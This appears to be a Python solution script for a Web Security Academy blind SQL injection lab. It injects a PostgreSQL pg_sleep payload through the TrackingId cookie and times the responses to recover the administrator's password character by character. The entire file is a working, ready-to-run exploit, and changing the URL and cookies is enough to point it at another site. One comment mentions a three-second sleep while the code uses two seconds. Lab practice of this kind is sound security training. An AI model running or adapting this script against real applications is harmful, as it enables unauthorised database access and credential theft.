import requests
import time

URL = "https://0a3a006603ed3e7b813bc56c006c00ea.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories"
SESSION_COOKIE = "olJuRekCGSiblEgauNPmQTRVWYSaTL01"
TRACKING_ID = "5kZBIBJhzOk0gBZX"
PASSWORD_LENGTH = 20
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

def check_char(position, char):
    payload = (
        f"{TRACKING_ID}'%3B"
        f"SELECT CASE WHEN "
        f"(username='administrator' AND SUBSTRING(password,{position},1)='{char}') "
        f"THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--"
    )
    
    cookies = {
        "TrackingId": payload,
        "session": SESSION_COOKIE
    }
    
    start = time.time()
    requests.get(URL, cookies=cookies)
    elapsed = time.time() - start
    
    return elapsed > 1.5  # 3 second sleep = correct character

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

password = extract_password()
print(f"\n[+] Password: {password}")
